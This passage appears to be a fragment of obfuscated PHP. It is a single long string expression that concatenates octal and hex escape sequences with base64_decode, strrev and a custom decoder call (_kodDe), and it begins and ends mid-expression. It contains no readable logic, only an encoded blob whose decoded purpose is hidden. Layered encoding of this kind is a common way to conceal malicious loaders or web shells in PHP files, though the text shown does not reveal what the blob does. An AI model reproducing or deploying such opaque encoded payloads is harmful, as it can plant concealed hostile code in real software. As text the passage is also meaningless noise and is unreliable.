55\267\237\77\175\325"."\251\157\354\351\162\37\261\364\147\47\74\76\353\255\255\173\117\374\342\245\121\77\275\173\105\330\267\147\352\13\277\374\362\364\270\336\370\356\33\353\37\276\343\344\355"."\346\352\107\157\36\333\124\61\365\324\331\177\364\76\275\341\276\345\277\364\336\71\367\361\173\256\270\243\177\342\151\165\77\254\17\256\53\173\376\210\313\57\171\142\205"."\157\314\321\203\163\176\232\331\261\73\227\370\313\353\125\43\357\112\254\133\163\307\153\317\277\63\356\316\322\325\103\203\271\347\337\176\347\266\125\245\143\217\271\175\335"."\xa7\x77\x5d\xfa\xc2\x87\xe9\xa2\x8b\x97\x4e\x7a\xef\xa5\x91\xc6\xd6\x7f\x9d\xba\xe2\xf9\x4b\x9e\x3e\xfd\xc4\x6b\x93\x83\x89\xcb\xaf\x78\x68\x77\x6c\xc2\xce\xab\xde\x3c\xa1\xb1\x6a".base64_decode('a2rrXunJI/fsnFo6snvybbHHb3yp8aV/73u9pOm9d2IDr3+565s33/jHM19/')."\x5f\x7d\x67\x30\x70\xcc\xaf\xe6\xdf\xb8\xf8\xa6\xd3\x4b\x36\x9e\xf2\xca\x83\xcf\x8e\x7a\xad\x32\xfa\xf4\xf5\x2d\x87\xad\xfa\xc5\x8a\xdf\x1c\x7f\xf0\xc4\x5c\xd1\xaf\xa6\xae\xfa\xe3"."\xa8\xaf\xc7\x57\x7e\x79\xcd\xb\xf\xc\xdc\xb0\xb7\xf4\xec\x23\x4e\xa9\xf4\xef\x79\xe8\x86\x2b\xcf\xd7\xa3\xab\x27\xbe\xb7\x75\x56\xd3\x3\xef\x34\x4d\x59\xbb\xa1\x35\x74\x56\x76".base64_decode('udLasqD5957GM8+KV3WMe+6tqcn9yW/W+BcdeP6G125/97VVZ7+8bWPu9r+e').base64_decode('Vl/3k7pz5r4+42fG2Iu2zHvpd/G7b94//4tFy/9665im4MiHp3y4tGTzTeOe')."\136\160\311\232\206\33\357\371\254\372\251\267\157\31\125\64\342\341\352\104\365\7\37\353\367\244\327\35\267\375\342\313\347\205\56\72\356\167\257\376\136\251\135\167\345"."\350\147\113\373\76\33\341\211\376\346\326\312\65\277\371\165\337\171\27\276\170\303\205\77\334\362\332\257\106\135\374\325\103\77\264\275\170\160\140\140\363\147\231\151\73".base64_decode('35j53D9OuOrJZzb7D3shHvc8FJ79UJ0vMDWjbB//avXLo8ePveSuq/y3H3r6')."\326\126\145\324\323\237\234\20\372\173\363\332\251\233\117\372\266\270\356\254\212\267\272\226\317\333\170\113\320\167\177\373\121\373\46\355\375\363\357\337\331\73\373\245\3"."\163\346\354\333\372\312\216\61\257\104\276\110\377\271\373\353\55\317\375\263\356\324\157\253\167\176\361\175\127\175\307\206\267\63\57\206\37\273\151\341\236\133\166\254\351".base64_decode('e9lTmz7Q/9rUjX9/ZXvfsVvkXdtHvf3Ux6fs3D2Q9E38xtjxzoA7m55XfmhM')."\x53\xff\x88\xb2\x25\x8f\x27\xd7\x8f\x58\xb0\xe1\xf9\xcf\x2b\xee\x99\xf7\xe5\x9c\x6d\x1d\x3d\x73\xd6\x95\x3d\x39\xf8\xab\xd7\xba\x2\x77\xfc\xe4\x91\xcc\x89\x2f\xbe\x77\xf4\x92\xd3".strrev('=¿šê´Ğ³İÉósÖ_ï­Ö¥ã{G:ê¨‹ËŒ«íiìF«íY~0ÚO')."\363\366\342\201\267\306\136\170\324\224\317\147\356\52\372\327\117\213\103\247\25\237\275\364\376\354\340\33\143\17\373\167\370\137\63\256\231\372\267\221\211\33\367\174\174".base64_decode('dGzbZ8FHY9MmHfHAI6dv0//aMPaLV24sXrl2xZEnJ8pP/tJ1ylMr2l7+7bpB')."\43\372\247\343\353\174\57\75\232\336\76\365\335\223\57\132\176\142\144\333\311\57\354\336\373\213\373\257\373\60\335\370\333\161\145\137\74\320\261\177\376\265\345\257\355"."\270\377\322\257\307\270\177\331\375\150\370\236\167\336\371\373\71\271\217\25\317\123\345\357\156\136\263\70\361\213\217\167\116\272\354\275\233\237\172\264\373\202\347\236\276"."\347\375\346\273\47\274\375\357\150\307\146\371\375\7\43\263\162\207\56\271\151\321\362\103\327\336\173\327\247\235\77\34\270\101\233\365\315\277\77\72\360\362\353\367\335".base64_decode('eE7us+fedb/z/b933XXuE9/tfXDHu99/9/dZma8W7nnnkXNvHzlwzqiNfVft')."\14\112\311\67\32\326\214\270\344\261\61\13\56\272\375\312\257\52\336\77\251\352\323\147\316\73\142\360\303\211\367\276\126\321\273\257\147\333\226\15\113\56\337\162\323"."\xcf\x6e\xdf\x92\xbd\x7a\xdc\x88\xcb\xa6\x1f\x77\xd8\xcf\x9e\xdf\xff\xdb\x7b\x37\xac\x3c\xe2\xcd\x8d\x53\x56\x6e\x55\x5f\x4b\x9b\x1b\xe\x4a\xd1\xd3\xe2\x4f\x6f\xda\x7b\x55\xeb\x47"."\367\366\176\376\371\274\147\357\74\174\372\237\307\34\137\265\361\316\322\223\217\271\376\244\303\172\246\165\334\372\273\267\77\173\140\343\352\262\15\167\216\75\346\334\103".strrev('ä§_Àªåõº½-¯Íäúm·oö²şGÓå¾M7G‘Ãõs|.÷[Óg¶¿ÖÓÎJK')."\56\112\337\275\253\152\314\77\327\177\272\344\37\73\232\127\136\171\335\37\26\37\132\331\123\276\145\174\356\225\312\337\356\374\354\233\121\323\257\34\345\72\147\312\366"."\xc8\x75\x9b\x4e\xb9\xa3\xf5\x8d\xd6\x7f\x8c\xb8\xf1\xb3\xf7\xd7\x9d\xd4\xa6\xce\x79\xec\xce\xe3\x7f\xb2\xa0\xe1\x5f\x25\x63\x2e\x6e\x79\xfc\x96\xcb\xfa\x5c\x23\xbf\xd5\xa7\x9f\x58"."\176\360\252\57\252\277\352\74\352\233\23\127\377\356\330\372\303\237\75\376\120\137\333\263\127\75\62\373\354\363\137\376\150\302\372\361\313\365\33\107\177\256\215\54\335"."\27\374\172\326\332\145\167\310\175\43\36\72\166\314\350\307\252\3\17\257\10\134\65\364\247\147\167\365\337\64\270\353\305\361\362\273\55\33\176\266\272\157\314\205\343"."\216\373\356\257\377\71\351\100\305\212\117\237\177\353\332\345\237\36\373\373\21\33\313\277\274\340\201\203\133\126\136\375\362\222\166\207\177\304\225\117\114\272\140\344\246"."\203\117\335\370\304\273\317\357\176\365\353\357\175\223\172\126\317\333\167\303\356\37\162\333\366\174\264\362\31\263\42\271\172\350\242\233\77\70\165\364\33\337\217\334\376"."\233\307\26\334\367\213\367\337\76\30\376\342\261\155\253\56\64\126\236\375\247\67\337\275\367\340\52\347\224\323\316\257\54\32\112\237\375\335\362\67\35\365\27\365\74"."\xbe\x79\xf9\xd2\x7b\x77\x1d\x28\x6d\x8e\xee\xed\xe9\xfb\x6c\x7b\xf9\x9d\xbf\x5c\x76\xe6\x6e\x79\xe2\x88\x27\xf6\x6e\x7f\x69\xdd\x27\xc5\x7f\x70\x7d\x39\xe6\x8a\xd8\xab\x7b\x56\x5f"."\270\145\340\344\313\147\216\370\373\347\115\233\206\236\333\274\175\216\353\340\310\163\7\127\336\145\234\160\306\317\27\356\177\241\264\272\376\226\223\116\214\124\255\174\374".base64_decode('9ju2ff9R4Gi5LCv3PVZZu3ve2k7Pzo5nb3kt7dkb/GtHaEfwkxeu+vjnp948')."\373\211\356\267\62\327\206\326\375\355\200\357\231\107\157\232\62\162\350\250\237\254\272\354\273\171\147\36\265\156\375\306\113\137\137\21\273\156\142\316\270\356\205\121\227"."\144\276\257\376\356\350\21\217\175\237\131\177\122\335\61\223\376\165\352\227\35\357\117\156\53\77\341\153\337\350\241\35\173\217\175\351\253\253\245\3\177\235\371\345\105"."\xef\x7d\x3d\x72\xda\xe2\xe7\xe\xfd\xcf\x9f\x4f\x7f\xe5\x88\x5d\x5f\x7f\xf0\xfe\xcc\xe7\x4f\x3f\xb8\x3e\xf5\xf4\xc9\x9f\xaf\x79\xf0\x4\xdf\xfa\xf\x4e\xfb\xea\xf7\x9e\x2b\xcf\x7b"."\xa5\xed\x93\xec\xdf\x66\x5c\x30\xae\x2a\x52\xfd\xb7\xf3\x52\xe3\x6e\x3c\xee\x8f\xff\xa8\x72\xae\x8d\x25\x9f\xfd\xf5\x8d\xa5\x27\x36\x6c\x3b\xe6\xf9\xad\x8b\x3f\x39\x65\xf2\xea\xd".strrev('—8ŒÓpdÁè»n›·íüTöï{ÏñÖØmwÓ5IÒøŞŸ\'Këò~ß;çÃÿ}')."\xed\x5c\xbc\xf0\xf1\x7f\xbb\x1b\xb3\x5f\x9c\xff\x48\xef\xa6\x17\xe\xdf\x7a\xec\xaa\x1d\x6b\xb7\x2d\xbd\x61\xf1\x83\x7d\x4b\xbf\x7d\x69\x9c\xe7\x9d\x39\x2f\xdd\x7b\xe0\xa4\x3e\x7f".base64_decode('6qTdS5Yfv03+8O6j6jY+tP99/7Y1v/Z/+/ZVHbO/u+DBv1TU/E/tq0+OKFmp')."\317\132\267\243\342\246\344\37\207\306\7\74\367\235\356\61\246\224\355\230\261\157\304\207\257\66\375\63\135\176\317\267\67\137\267\352\243\217\176\275\367\325\266\133\237".strrev('õğÿÄw{CÒît×Ù¿ïêñ;ßÚsÊö¸L|ØL­Ò¸ŸïqnsMËò¯²Öİ').base64_decode('dx+tjHQ+/tWr2889Z/lnP4y89tPa3KFvz132xWeXjA48cen11907MGvrdx+8')."\376\331\37\356\377\317\340\327\273\212\257\75\375\211\245\237\335\373\356\342\145\377\174\147\337\374\163\267\175\363\372\135\377\371\376\253\17\156\335\171\376\301\147\224\263"."\277\33\361\363\253\137\317\75\66\155\377\163\261\33\256\135\173\360\265\267\27\272\57\270\353\353\245\231\367\17\174\276\347\343\340\321\115\153\137\177\255\365\261\227\77"."\xf9\xe4\xe0\x97\x5f\x7d\x7a\xfc\x9\x27\x5c\xd2\x74\xdb\x67\xb1\xa1\x65\xfa\x7f\xfe\x74\xfd\x4f\xaf\x4c\xaf\x7f\xe3\xba\x5d\x7b\xcd\x83\x5b\x4e\xfb\x72\xb4\xe7\xd9\x5b\x1f\xdc\xd7".base64_decode('s3xxybq/rO3Z9E5i/8EfDts44pzRte+tDvtvbHk1ftaX5v6xbYfGXn/p9akT')."\166\227\336\60\341\321\335\217\266\227\215\231\367\362\232\310\352\375\235\77\273\164\316\327\357\267\125\277\356\70\355\363\353\356\375\375\121\211\203\367\152\125\77\351\330"."\141\26\135\64\263\342\202\207\374\17\165\74\170\354\341\77\214\254\133\373\330\306\33\106\123\205\373\254\146\46\123\151\162\257\105\224\63\46\115\47\37\223\51\243\252"."\xf6\x29\x3\xbd\x3a\xb9\x91\x4b\x6a\x43\x83\xdd\x54\x3f\x7d\xd2\x64\x92\xa4\x72\x1a\x39\x58\xe8\xcd\x46\x87\x6\x53\x84\xb9\x1f\xec\x1f\x48\x46\x73\xe4\xc2\x88\xa8\xfc\xf6\x67\xd2".base64_decode('A30q4eGJOsa0KeTSTdPlbGyIMNmTpkzHH1UVtCFmTunTh0jzplZQhpo0WI53').base64_decode('D2ZMchhGskybTj661P74IGXvc32xLjNOFKimT6UaNSk525+jN5TxnoHBLGnn')._kodDe('LlmEeUPAiIgrOgmxAd80l3v6wi0JAyM633gWIxxilQECArYe2T5Ww8Cbzf3kgQ==')."\366\351\152\322\354\322\262\64\75\351\23\235\3\222\75\251\14\16\351\121\162\260\331\37\215\17\44\162\103\164\344\247\120\131\74\253\367\304\6\351\100\222\61\121\162"."\xaa\x66\x66\xa8\xae\xea\x50\xd6\x50\x7b\xe8\x90\x57\x91\x3a\xba\x6\x95\xee\x4c\x96\xb4\x7e\x28\x3e\x60\xe6\xa2\xa4\x5f\xbd\xc9\x44\xf7\x80\x4a\xda\x39\x91\x8c\x5f\x4f\xae\x37\x63".strrev('36nŒ™6¥‰“&ª©ÔÓi:j¥ö•9”©dÊíëêm$–„¹²G©ŠI$').strrev('ı]ÒSšh%_´x´gD–¶”WJ’äÊŠHNÒBš®ûÕ(™iõ‰A‘&ÓÅIÄK')."\61\162\141\254\345\6\173\165\252\132\253\16\365\311\346\40\231\205\256\164\177\157\162\200\14\145\242\173\160\40\227\241\243\115\47\150\152\345\24\332\75\62\234\64\46".strrev('ti´Ú{Êô27ì›4\'HêD£{ûgJuzqcW*EÓ¤N\'kH_2zç§Õ')."\250\110\111\372\240\72\320\333\103\16\56\246\127\220\162\315\164\337\140\266\237\314\316\140\166\100\357\117\320\145\67\211\266\145\62\371\230\70\235\142\333\124\212\103\275"."\172\62\233\112\320\363\202\104\114\355\46\243\60\211\42\162\377\100\257\334\107\57\103\53\151\11\311\156\45\235\215\222\264\135\132\217\221\316\220\105\65\211\342\315\224"."\151\244\22\63\227\35\144\132\75\203\251\170\137\242\233\254\306\201\256\104\177\257\114\17\354\7\207\342\72\45\40\106\274\57\331\115\57\57\246\121\264\31\354\35\110".base64_decode('Gf0EWkVnXI8PgQmktGM6qTWjp3P9WaICWTmJpB3q1vRYHzknm8IoUyLX20OW')."\177\162\40\141\244\372\110\151\132\137\177\62\23\37\244\303\107\21\233\226\126\71\155\72\135\26\24\303\247\23\310\64\72\14\35\51\102\4\352\344\150\57\75\73\66"."\114\331\314\32\266\4\324\330\41\52\252\273\366\52\12\125\273\244\352\234\374\222\333\310\42\5\161\32\317\317\37\340\21\222\160\31\16\203\41\61\155\64\155\12\321"."\40\144\211\205\247\360\360\230\4\207\102\46\40\316\364\62\36\253\371\270\140\253\134\326\116\124\124\132\122\304\272\54\361\14\112\17\124\354\61\335\166\170\27\32\56"."\246\104\1\377\220\316\140\23\31\103\351\313\52\114\227\33\247\166\321\61\352\22\306\32\237\170\233\262\321\353\22\301\116\61\126\115\203\252\223\111\227\325\164\12\332"."\xd1\xd0\xa9\x89\x70\xd5\x52\x38\x3c\xed\x82\xe2\x3\xc\xb\xc7\x90\x7c\x0\xf8\xd\xa7\x0\xe3\xc3\x2e\x8c\x94\x75\x1e\x5\x1d\xba\x4c\x4c\x63\xd0\x98\x61\xb1\xf8\x22\x18\x97\xca".base64_decode('waDwXWjAhVrZSLl4j0rgJ7lGgYdtUrcMALFqqRtggUS1niVTo99kvJBZnRvV')."\52\214\225\30\207\233\352\32\246\131\226\176\307\115\72\326\374\300\223\64\126\120\353\305\67\12\34\40\242\217\25\253\55\210\145\135\17\344\256\16\31\116\71\44\134"."\xa1\x43\x42\x97\x80\x92\xd5\xa8\xc7\xd7\x20\xb1\xdb\x54\x11\x7b\xc4\x46\xea\x4a\x26\x29\x47\x59\x3\x33\xb9\x82\xc3\x27\x36\x47\xbc\x81\xb4\x75\xc0\xb2\x10\xed\x5d\xb0\x44\x82\x51"."\316\122\325\130\313\315\233\126\237\224\15\203\153\256\242\373\130\336\134\34\144\227\46\41\120\40\273\147\326\225\230\112\25\11\225\24\112\111\210\23\126\276\146\32\214"."\xd1\xa4\x22\xeb\x96\xb\x99\x99\xb5\x99\x44\x6\x1a\x45\x9a\x33\x6a\x89\x89\x16\xb9\x79\x8a\x8\xf5\x92\x6f\xae\x4c\x2e\x42\x93\xf6\x4b\x1e\xba\x1c\x5d\xd\x75\x82\xf5\x22\x4c\x46"."\162\360\13\74\0\363\102\245\250\341\340\15\354\2\134\12\145\343\161\305\60\253\221\201\204\124\56\201\266\114\165\115\2\37\10\221\47\273\246\202\117\64\20\344\256"._kodDe('MSCR2LpMsiHG++nAU9Zd+ETXmqoT3l9foXwmT0R9VP5+Hef/Lam9wxr0bmCanw==').base64_decode('uQDjC7aGmIE0v8hCI0UagnFXkE8jzI468yNZTXHMM2D7STNFLiMp07srA+xJ')."\x6a\x5a\x61\x8\x90\x35\xd8\x31\x3f\x54\x8f\x8c\x44\x93\x1a\x25\x9c\x0\x59\x22\x31\x95\x44\xfa\x7d\x75\x91\x6\x5f\x90\x6f\x7c\xd4\x82\xc7\xd3\xe6\x8b\x84\x42\x1\xc1\x7a\xb7\x5a"."\40\140\320\72\201\337\163\302\20\267\122\200\167\7\242\112\211\141\14\200\155\235\340\263\67\54\101\115\322\220\104\114\236\0\356\324\67\173\202\114\133\164\262\253\302"."\125\311\323\202\12\43\120\151\266\206\232\110\205\302\236\140\1\243\126\154\354\112\306\227\30\270\222\14\315\201\371\122\175\300\337\336\322\32\302\126\234\30\336\32\20"."\xe2\x91\x4e\x20\x89\xa6\x26\xaf\xf9\xd1\xa4\x78\x6f\x9b\xdf\x53\xef\x95\x7c\xad\xe1\x0\x55\xfa\x65\xaa\x5d\x48\xdd\x3b\xc4\xc2\x74\x8\x74\x43\x61\xc6\xac\x24\x3f\xe\x88\x2a\xe9"."\142\211\254\44\202\221\13\35\305\235\105\235\145\235\45\235\245\113\134\235\306\42\267\70\45\144\177\151\153\40\135\252\146\137\154\123\152\11\205\316\42\46\14\201\240"."\xa7\xde\x4f\xab\xaf\xf3\x84\xc8\x67\xa0\xde\x87\x3f\x3e\xb8\xe6\x81\xbd\x5b\x57\x7d\x70\xfd\x7d\xfb\x2e\xbb\x2\x14\xb4\xff\xba\xb\xf6\x5f\xfb\xf0\xde\x2d\x57\x7c\x78\xe1\xb6\x7d"."\xf7\x5d\xfe\xc1\x13\xab\xf6\x5f\x73\xff\xfe\xcb\xcf\x27\x6d\xfe\xf0\xfe\x47\xf6\x6e\xfb\xc3\x7\xd7\xdc\xbd\xef\xbe\xf5\xfb\xd7\x3d\xfa\xc1\x75\xbf\xc6\x11\x7\xee\x79\x60\xdf\x8a"."\273\131\303\244\3\127\77\261\177\325\35\373\327\376\156\377\25\367\355\333\172\365\276\307\57\330\267\145\213\3\344\76\160\321\25\37\154\273\157\377\245\353\366\337\166".strrev('”iÜ^íqr~!xpy†{_ïŠø»î­ßº¬İÃo²ÜVûÍÿîV‡şŞ')."\x95\xe0\x21\xed\x34\xca\xe1\x70\x96\x82\xdf\x12\xa8\x37\xc\x7e\xa9\x8a\x24\x40\xb9\x10\x34\x2c\x6a\xad\xf7\xda\xf5\xf0\xc5\x20\xb1\xfe\x2d\xc3\x58\x1\x91\x9a\x71\x35\x6\xb1\x1e".base64_decode('puEIsrkoHrYVy8icC40SGtPgDdUHfXVeopnKJmoCUnok998AGgrOY9/MCiXP')."\146\133\52\241\10\134\52\131\72\42\273\242\32\20\47\322\250\261\122\21\124\111\51\162\100\32\216\30\32\251\10\356\101\0\240\104\301\162\53\201\306\234\110\233\256"."\xb8\xa3\xd8\x51\xe1\xa8\x2c\x95\x88\x41\x37\xce\x41\xc\xb8\xa5\x22\xa2\x2b\xc9\xf2\x59\x2a\x71\x74\x59\x42\x95\x8e\x8a\x52\xa9\x28\xd3\x5b\x44\xda\xc5\xc7\x15\xb4\x3e\x82\x53\x1a"."\x92\xec\x28\x21\xd\x16\x9b\xcb\xd3\x2\x2\x68\x98\xba\xac\xa6\x4d\x43\x8a\x3a\x18\x88\xe5\x7\xbf\x16\xa3\xec\xa8\x8b\xe7\xc0\xf3\x4\x52\xd8\x61\x92\xa7\xb5\xc1\x9a\x12\xdb\x72".base64_decode('txVLcjoGYvD4itNcXCp1EX3fApEom2UwaiyDUVJOaENbE5tvrKIrYVsP3CzZ').base64_decode('oBNFoGiqIBTPFk2rgW6AycHpwQeL6VVyvCRAglgEnUEIZ5NYIA4Z2RdhXgn3')."\63\145\304\51\171\43\126\336\55\35\254\17\24\227\45\272\323\63\23\175\150\265\342\15\327\67\143\54\17\11\150\36\353\232\140\101\124\76\234\222\5\105\222\324\336"."\x92\xa4\xc3\xcb\x5\x12\x84\x63\x51\x3a\x5f\x6b\x63\x20\xd8\x82\xad\x35\x42\xf5\xcd\xde\x16\x8f\x8b\x10\x6e\x8c\x9\x38\x3d\xe4\x54\xa4\x1a\xa9\x18\x52\x3e\xc\x2a\xb6\xc\x3f\xaa"."\x88\xe\x59\x18\xd5\xa\xd6\x55\xc4\x4\x3c\x9\x1e\x85\x4c\x9c\x34\x86\xcc\xbe\x84\xac\xf6\x64\x94\xa5\xa6\x18\x1b\xc1\x92\x22\x99\x47\x89\x40\x30\x1c\x1\x3\x40\xc8\xb3\x40\x75"."\213\205\35\102\120\344\204\106\7\375\214\37\226\243\100\310\243\66\336\135\324\361\4\50\34\226\131\37\150\155\364\121\303\224\206\56\113\134\103\320\7\15\57\111\265"."\x12\x2d\x21\xc2\x6f\xf7\x41\x20\x33\x10\x63\xdf\xdc\xe8\x10\x46\xb0\x1d\x1d\x4\xf8\x86\xe\x63\x4\xff\x17\xb0\x9a\x50\x2b\xfb\xe6\x8c\x20\x8\x40\x85\x3a\x4e\x5b\xe7\x37\xb0\xef"."\146\146\54\6\43\2\101\41\340\11\172\132\102\54\30\234\17\150\65\204\11\266\123\55\236\120\30\364\252\265\275\205\323\163\277\147\36\100\205\0\147\71\50\55\56".base64_decode('cZXVlnZiyxD8iX9m0xDUqF+0tNIhTVleStJQW4qImVDTlBGEtZzlj/gDTTiM')."\xfc\x72\x78\xd3\x31\xce\xab\x4b\xb\x25\xc0\x74\x86\x39\xd3\x69\xd0\x8d\x89\xe1\xba\x4\x30\x54\xc2\xe6\x66\x52\x6b\x60\xbe\x87\x3b\x79\x10\x22\x30\x84\x58\xb9\x49\xdc\xf5\x83\x7b".base64_decode('8cLOgU4X4AKMJdzgo6FOovxFPXSVQqwPSG4P3SuXOMi2EElqccbjtTZQngD/')."\56\240\37\210\40\222\14\100\252\313\44\251\345\7\66\71\211\164\56\353\74\263\323\351\302\126\66\220\53\351\164\360\46\105\274\13\300\106\32\12\131\114\204\42\310"."\177\1\51\35\164\226\174\341\245\211\3\63\311\17\21\120\146\222\41\40\301\131\65\154\116\275\147\55\153\5\177\233\302\313\274\340\257\37\374\370\303\140\326\124\226"."\x0\xac\x3b\xbf\x6f\xae\x77\x19\xfc\x87\x47\x94\xb2\x81\xc4\xa\xf9\xd6\xc\xbe\xd6\x65\xe0\x5f\x40\x45\x96\xf9\x5a\xed\x85\xd5\x79\xc3\xf3\xbd\x5e\x9c\x80\x7e\x93\x5f\x9e\x14\x50"."\x15\xd2\x55\xc1\x7d\xcb\x9c\x0\xb5\x10\x93\xfc\xde\xc6\xb0\x4\xc3\xb4\x19\x91\x48\x9\x1a\x4c\xe7\xa2\xf2\xd2\x48\xc4\x6d\xb4\x13\xb4\x61\x86\xb8\x25\xc5\xe3\x2b\x8b\xc9\x46\xe1"."\11\325\163\22\153\101\210\174\134\100\132\307\126\104\140\356\110\110\270\51\30\150\157\23\302\315\236\171\276\326\46\32\162\227\321\257\62\352\37\241\301\27\2\103\124"."\117\221\221\173\111\21\303\204\253\104\274\217\310\316\132\60\273\1\220\157\20\20\170\161\310\345\143\362\153\135\154\165\355\76\177\203\150\25\11\23\222\135\3\221\156"."\xb2\x71\x4c\xa0\x8d\xa3\x61\x64\x1f\x49\x3\x70\xc8\xe9\x37\x42\x37\x1a\x40\x63\x40\x3\x78\x0\x68\x8\xd\x17\xd\x20\x6f\x2c\x34\x80\x3a\x4a\x3\x50\xec\xf0\xb6\xd2\x38\x20\xc7".base64_decode('ARmMCmdxroyakPuZhc+MWJdgoQspsQs70oBm20AGlNmpme3wCx3KCFI0VjCT')."\4\103\103\170\212\46\234\243\270\161\12\300\154\242\64\340\267\163\111\55\142\206\227\120\224\305\306\155\146\130\65\223\226\112\211\75\14\250\324\207\354\211\204\152\311"."\166\316\17\136\260\136\147\104\23\24\342\261\35\15\71\320\343\107\35\126\251\210\121\244\45\114\330\41\236\237\34\344\127\347\335\262\252\351\101\10\301\203\343\361\117"."\47\111\113\117\3\210\241\117\261\203\154\260\276\100\304\17\266\215\210\50\63\372\2\344\10\301\325\45\132\224\106\270\141\252\113\346\312\162\246\236\25\334\273\40\305"."\x39\x30\x8d\x1e\x6e\x7f\xc6\x4e\x35\x50\x5c\xb6\xb\x26\x16\xc6\x4d\xd5\xaa\xe1\xe9\x13\x84\xe2\x95\x49\x98\x27\x8\xa4\x76\xa8\xd8\xed\x8d\x5d\xab\x4d\x4\x73\xc5\x38\x76\x2\x4c"."\xf5\xf1\x54\x30\xe4\x96\xc\xe2\x29\xa8\x1c\x23\xf9\x60\x29\x12\xad\x19\x9d\xd6\xa5\xad\xbe\x59\x0\x4a\x24\x23\xd0\x66\x13\x30\x3c\x11\x85\xb7\x3f\xa5\x18\x6\x3b\x68\x46\xc\x0"."\375\64\23\334\140\116\164\101\323\120\107\307\52\233\66\103\112\222\134\101\64\164\41\225\102\256\164\316\6\316\20\124\15\321\221\31\37\157\354\35\310\226\221\224\344"."\x63\x1d\x17\x52\x71\xa0\x9f\x3b\x9b\x81\xa7\x55\xbc\xcc\x45\x94\x49\xe5\x9d\x1c\x52\x33\xf6\xb3\xab\xb4\xd6\xa6\xe8\x29\x15\x1d\xc3\xcd\xe7\x5a\xc3\x2c\x5e\xc8\x8d\x94\xb3\xb5\x1f"."\33\334\154\32\324\320\306\146\326\131\111\23\323\233\133\204\60\22\143\325\230\52\54\230\122\224\127\320\336\104\124\203\24\253\47\61\116\235\141\153\234\251\151\55\162"."\72\27\326\346\251\364\102\264\41\60\277\325\37\240\76\64\250\203\35\102\262\310\275\32\20\167\164\27\15\230\364\103\227\111\315\363\351\226\6\217\76\5\157\153\147"."\210\70\200\46\223\343\244\47\130\337\14\230\321\110\243\17\360\340\336\5\141\136\100\63\310\12\330\333\26\152\120\16\250\50\44\127\176\55\316\226\51\40\107\304\203".base64_decode('gmWp+gIkr0uB+s1Y6xXqo7OM2GXAf8/ULnghGmYVFsxXTxKyCnUkOvz3CoMK')."\x67\xa8\x41\x36\xa4\x4e\xfe\x5f\x33\x71\x7f\x58\xa8\x26\x94\x49\xa0\x50\xb6\x3c\x8\x55\xb0\x7a\x2e\x99\xd5\x4\x89\xe6\x16\xe0\x80\x2c\x2\x49\xa1\x19\xec\x9e\x81\x60\x7\xe9\xbe".strrev('b¤tÿ·qø'."\n".'>"”´@máŞ‹ìo )bşàÑ9ò|˜„)FFè&|:P¶')."\116\320\170\162\353\23\123\114\146\33\16\327\224\207\114\1\154\267\140\344\223\142\344\150\100\160\330\42\367\53\120\203\234\262\340\171\115\40\203\300\73\110\207\205\331"."\x66\xc3\xcd\x98\x7b\xe4\x98\x1b\x68\x88\x84\x2\xed\x41\x7a\x62\x7\xc3\xc8\x50\x28\xe8\xad\xef\x60\x7\x69\xc\xda\xe8\x99\x67\x87\x40\x8c\xf\x7b\x9a\xa\x82\x99\xb4\x4\xe1\x88".base64_decode('H4kEA1Bo9PobbRlCzcx3jhUW8fta5xaMCAciLUIWDPSFvS12mLWEkBeuVh6u')."\363\7\352\205\150\137\40\177\44\0\23\144\3\142\331\23\3\1\23\335\271\24\161\36\325\200\1\211\55\203\154\253\63\2\270\336\332\316\345\245\45\235\356\132\127".base64_decode('GRO6MPUQbFyGARuUysP9gOIeTkVCbpeLlMk+gBTI/A9QGkn8k4WwpbalUpuN')."\46\65\27\163\331\335\371\370\360\61\171\44\324\21\142\203\213\61\257\120\274\5\235\160\62\361\206\310\226\30\374\155\23\223\206\25\172\13\157\113\150\301\107\213\141"."\x90\x8\x72\xa9\x1a\x47\x7d\xbe\x6a\x63\x5a\x34\xb\x8d\xc1\xf9\x0\xf3\x3d\x4\x80\x5c\x7c\xff\xa4\xcb\x8c\x1d\x7\x90\x1d\xc4\x29\x7a\x72\x83\x63\x2a\xb2\x2\xb1\x2e\xdb\x76\x40"."\x0\xdc\x8f\xa7\xb0\x69\x70\x60\x15\xbd\xb6\xee\x70\xa6\x9c\xb1\xce\x70\x13\xf4\x4b\xd3\x79\x36\x6b\xa0\xaa\xb\xfe\x61\xa2\x5a\x3a\xa6\xa\x46\x69\x72\x94\xee\xfa\xd9\x68\x2f\x35"."\221\101\64\313\160\16\250\164\10\306\63\123\162\162\335\31\221\221\327\204\210\170\333\335\347\64\324\170\332\51\47\343\32\340\0\22\51\12\225\173\55\361\334\111\121"."\106\113\252\324\145\104\237\23\124\41\304\341\304\240\160\112\353\341\375\14\363\354\4\3\6\13\211\170\201\50\41\345\114\271\111\252\300\336\40\262\334\154\303\115\6"."\144\316\250\102\250\147\325\322\44\342\141\255\21\360\147\61\216\341\324\147\26\267\131\204\73\74\162\52\206\203\16\211\373\153\244\22\147\141\366\3\112\67\202\375\10"."\x25\x1c\xa9\x5e\x7e\x43\x9c\xea\x65\x57\x51\x51\xcb\x66\xa\xf7\xad\x46\xe1\x22\x99\xef\x97\xc4\x39\x22\x88\xab\xcb\xd1\x7b\x5a\x62\xed\x51\x97\x83\x1b\x5e\x1e\x8f\x6\xd\x8\x45"."\377\222\236\371\241\111\316\346\26\117\275\23\220\277\52\252\341\3\66\241\316\60\330\205\50\202\311\3\306\44\312\11\143\110\371\24\51\1\146\204\140\116\276\123\247"."\361\126\57\146\30\210\135\23\1\131\54\6\257\350\350\134\141\250\15\243\60\220\163\355\70\214\135\136\320\173\345\204\314\32\14\273\201\277\12\325\273\240\140\275\13"."\xa\xd5\xbb\xc0\x56\xef\x82\xfc\x7a\x31\xc8\x86\xb9\x72\x26\x53\x8f\xbd\x26\x8a\x24\xc6\x2\x8a\x8a\x1\x4a\x86\xbb\xe1\x85\xa4\x78\x91\x49\xa4\x4e\xac\xcb\xe2\x2\xd1\xd\x98\x9"."\214\261\364\6\377\142\253\243\133\130\67\226\342\134\204\136\305\50\325\67\50\325\117\312\206\11\171\341\377\13\327\143\320\124\271\205\61\350\214\327\162\153\206\341\206"."\xde\x56\x10\x87\xc9\x6e\xcc\x3\x21\x7a\xe2\x66\xed\x13\xf6\x41\x2c\xc8\x83\xc4\xf5\x3\xf3\x82\xc5\x7c\x64\x71\x47\x5a\xf8\xa0\x4\x7f\x7b\x99\x2d\x32\x60\x94\x3d\x71\x25\xa4\x40"."\172\107\106\305\73\230\321\14\105\164\346\26\123\220\367\37\146\154\46\70\100\113\311\203\220\42\121\105\2\301\25\32\365\22\46\272\136\201\3\346\114\131\174\60\16"."\72\101\